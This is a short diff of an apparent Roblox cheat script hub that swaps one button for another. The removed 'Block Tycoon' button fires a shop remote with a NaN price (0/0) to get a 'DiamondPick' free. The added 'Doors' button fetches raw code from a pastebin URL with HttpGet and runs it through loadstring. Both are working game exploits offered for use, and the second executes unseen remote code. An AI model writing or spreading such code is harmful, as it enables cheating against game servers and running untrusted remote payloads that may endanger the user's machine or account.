@@ -26,9 +26,9 @@ MainSection:AddButton({
 })
 
 MainSection:AddButton({
-	Name = "Block Tycoon",
+	Name = "Doors",
 	Callback = function()
-      		game:GetService("ReplicatedStorage").ShopE:FireServer(1, {"DiamondPick", 0/0})
+      		loadstring(game:HttpGet("https://pastebin.com/raw/DSA5ZbX1", true))()
   	end    
 })
 
